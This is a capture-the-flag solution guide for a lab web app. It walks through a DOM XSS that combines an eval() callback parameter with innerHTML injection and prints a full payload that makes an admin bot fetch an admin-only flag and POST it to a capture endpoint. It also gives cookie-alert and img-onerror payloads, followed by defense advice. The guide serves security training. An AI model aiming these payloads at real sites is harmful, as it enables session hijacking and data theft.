# CTF_4 IntraDesk — Solution Guide

## Challenge: DOM XSS in Knowledge Base with Bot-Driven Flag Exfiltration

### Objective

Exploit a DOM-based XSS vulnerability in the Knowledge Base search page to steal your **per-user flag** from an admin-only endpoint. A moderator bot automatically visits reported URLs as an admin, so you must craft a URL that, when visited by the bot, fetches your flag and exfiltrates it to a capture endpoint you can read.

---

### Vulnerability Location

The vulnerability exists in **KnowledgeBase.tsx** in the `headerCallbackRef` callback ref function.

**Vulnerable Code (simplified):**
```tsx
const headerCallbackRef = useCallback((node: HTMLHeadingElement | null) => {
  if (node) {
    const urlParams = new URLSearchParams(window.location.search);
    const rawSearch = urlParams.get('search') || '';

    // ⚠️ Unsafe: directly inserting user input into innerHTML
    node.innerHTML = 'Results for "' + rawSearch + '"';

    // ⚠️ Unsafe: directly executing user-supplied JavaScript
    const callback = urlParams.get('callback');
    if (callback) {
      eval(callback);   // <-- arbitrary JS execution
    }
  }
}, [searchTerm, selectedTag]);
```

There are **two** XSS vectors:
1. **innerHTML injection** via the `search` parameter (HTML context)
2. **eval() injection** via the `callback` parameter (direct JavaScript execution)

The `eval(callback)` path is more reliable and is the intended solution path.

---

### Exploit Chain Overview

```
Player crafts URL with XSS payload
  → Player submits URL via /report page
    → Bot (logged in as admin) visits the URL
      → eval(callback) executes JavaScript in admin's browser session
        → JS fetches /api/admin/flag?reportId=X (admin-only endpoint)
          → API returns the flag of the user who submitted the report
            → JS POSTs the flag to /api/exfil/capture
              → Player reads the captured flag via /captures page
```

---

### Step-by-Step Exploitation

#### Step 1: Identify the XSS

Navigate to the Knowledge Base (`/kb`) and try adding a `callback` parameter:

```
http://localhost:5174/kb?search=test&callback=alert(1)
```

You should see an `alert(1)` pop up, confirming arbitrary JavaScript execution.

#### Step 2: Understand the Flag System

- Each user has a **unique flag** stored in the database
- The admin endpoint `GET /api/admin/flag?reportId=X` returns the flag of the **user who submitted report X** (not the admin's flag)
- When the bot visits your URL, it appends `?_reportId=X` so your payload can reference it
- The exfiltration endpoint `POST /api/exfil/capture` is public (no auth required)
- You can view your captures at `/captures` (authenticated)

#### Step 3: Craft the Payload

The payload must:
1. Read `_reportId` from the URL (appended by the bot)
2. Fetch the admin flag endpoint with that reportId
3. POST the result to the exfil capture endpoint

**Key constraint:** In URL query strings, `+` is decoded as a **space**. You must use `.concat()` instead of `+` for string concatenation in the callback value.

**The payload (readable):**
```javascript
fetch('/api/admin/flag?reportId='.concat(
  new URLSearchParams(location.search).get('_reportId')
)).then(function(r) {
  return r.json()
}).then(function(d) {
  fetch('/api/exfil/capture', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      data: d,
      reportId: new URLSearchParams(location.search).get('_reportId')
    })
  })
})
```

**The payload (one-liner for the URL):**
```
fetch('/api/admin/flag?reportId='.concat(new URLSearchParams(location.search).get('_reportId'))).then(function(r){return r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new URLSearchParams(location.search).get('_reportId')})})})
```

#### Step 4: Construct the Full URL

```
http://localhost:5174/kb?search=test&callback=fetch('/api/admin/flag?reportId='.concat(new+URLSearchParams(location.search).get('_reportId'))).then(function(r){return+r.json()}).then(function(d){fetch('/api/exfil/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({data:d,reportId:new+URLSearchParams(location.search).get('_reportId')})})})
```

> **Note:** In the URL, `+` between words represents a space (standard URL encoding). Inside `.concat()`, `'...'` string literals use `%27` for single quotes. The bot appends `&_reportId=X` automatically.

#### Step 5: Submit the Report

1. Log in with your assigned credentials
2. Navigate to the **Report** page (`/report`)
3. Paste the full URL from Step 4 into the URL field
4. Submit the report

#### Step 6: Wait and Retrieve Your Flag

1. The bot picks up the report from the queue within a few seconds
2. It logs in as admin and visits your URL
3. The `eval(callback)` executes your payload in the admin's session
4. The admin's cookies authenticate the `/api/admin/flag` request
5. The flag is POSTed to `/api/exfil/capture`
6. Navigate to the **My Captures** page (`/captures`) to see your flag

---

### Why `.concat()` Instead of `+`?

URL query strings use `+` as an encoding for space (RFC 1866). When the browser's `URLSearchParams.get('callback')` decodes the parameter value, any `+` becomes a literal space character. This means:

```
callback=a+b     →  eval("a b")      ← SyntaxError!
callback=a.concat(b)  →  eval("a.concat(b)")  ← works!
```

Similarly, `return+r.json()` is valid JavaScript because `return` followed by `+r.json()` is a unary plus (returns the value of `r.json()`).

---

### Alternative Payloads

**Simple test (verify XSS works):**
```
http://localhost:5174/kb?search=test&callback=document.title='HACKED'
```

**Alert with cookie:**
```
http://localhost:5174/kb?search=test&callback=alert(document.cookie)
```

**innerHTML-based XSS (search parameter):**
```
http://localhost:5174/kb?search=<img+src=x+onerror=alert(1)>
```

---

### Defense Recommendations

1. **Never use `eval()`** — remove the callback parameter entirely
2. **Use `textContent` instead of `innerHTML`:**
   ```typescript
   node.textContent = `Results for "${rawSearch}"`;
   ```
3. **Sanitize with DOMPurify** if HTML rendering is needed:
   ```typescript
   import DOMPurify from 'dompurify';
   node.innerHTML = DOMPurify.sanitize(headerHTML);
   ```
4. **Implement Content Security Policy (CSP)** headers to block inline script execution
5. **Validate report URLs** server-side to only allow specific paths/patterns

---

### Flag Format

Each user gets a unique flag in the format:
```
CTF{user_<username>_<random_hex>}
```

Example: `CTF{user_abcd12_8bb73ad76fdd80e0}`

The flag is derived per-user, so sharing flags between participants won't work.

---

### OWASP Classification

This challenge covers:
- **A03:2021 — Injection** (DOM XSS via eval and innerHTML)
- **A05:2021 — Security Misconfiguration** (eval enabled, no CSP headers)
- **A07:2021 — Identification and Authentication Failures** (admin bot visits user-supplied URLs)
